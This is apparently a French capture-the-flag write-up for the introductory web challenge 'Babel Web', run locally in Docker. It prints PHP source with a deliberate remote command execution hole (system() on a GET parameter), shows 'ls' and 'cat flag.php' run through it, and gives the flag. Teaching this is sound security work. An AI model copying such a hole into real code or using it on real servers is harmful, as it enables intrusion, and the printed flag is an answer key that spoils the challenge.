## Épreuves

### Difficulté: Introduction

### Challenge: Babel Web

#### Problème

On vous demande d’auditer ce site en cours de construction à la recherche d’un flag.

#### Résolution

Pour résoudre ce challenge, suivez les étapes suivantes :

1. **Téléchargement et exécution des fichiers** :
   Après avoir téléchargé tous les fichiers nécessaires, exécutez la commande `docker-compose up` pour démarrer le service Docker. Ensuite, ouvrez le site web à l'adresse `http://localhost:8000/`.

2. **Inspection initiale du site** :
   Lorsque vous visitez le site, vous voyez une page simple en HTML :
    ```html
   <html>
       <head>
           <title>Bienvenue à Babel Web!</title>
       </head>    
       <body>
           <h1>Bienvenue à Babel Web!</h1>
           La page est en cours de développement, merci de revenir plus tard.
           <!-- <a href="?source=1">source</a> -->
       </body>
   </html>
    ```
    Le commentaire HTML <!-- <a href="?source=1">source</a> --> suggère qu'il pourrait y avoir un moyen d'afficher le code source en ajoutant ?source=1 à l'URL.



3. **Accès au code source PHP** :
    En accédant à : `http://localhost:8000/?source=1`, vous pouvez voir le code source PHP de la page :

    ```php
    <?php
        if (isset($_GET['source'])) {
            @show_source(__FILE__);
        }  else if(isset($_GET['code'])) {
            print("<pre>");
            @system($_GET['code']);
            print("<pre>");
        } else {
    ?>
    <html>
        <head>
            <title>Bienvenue à Babel Web!</title>
        </head>    
        <body>
            <h1>Bienvenue à Babel Web!</h1>
            La page est en cours de développement, merci de revenir plus tard.
            <!-- <a href="?source=1">source</a> -->
        </body>
    </html>
    <?php
        }
    ?>
    ```

    Le code PHP révèle deux fonctionnalités importantes :

    **.** Si le paramètre source est défini dans l'URL, le code source du fichier actuel est affiché.
    **.** Si le paramètre code est défini dans l'URL, la commande spécifiée est exécutée sur le serveur.
4. **Exécution de commandes sur le serveur**:

    En exploitant la fonctionnalité de la commande `code`, vous pouvez exécuter des commandes shell. Par exemple, en accédant à `http://localhost:8000/?code=ls`, vous verrez la liste des fichiers dans le répertoire :
    ````
        flag.php
        index.php
    ````
5. **Lecture du contenu du fichier flag** :
   
    Pour afficher le contenu du fichier flag.php, accédez à `http://localhost:8000/?code=cat flag.php` Cela affiche le contenu suivant :

    ```php
    <pre><?php
        $flag = "FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}";
    <pre>
    ```

#### Solution

Le flag est : ``FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}``
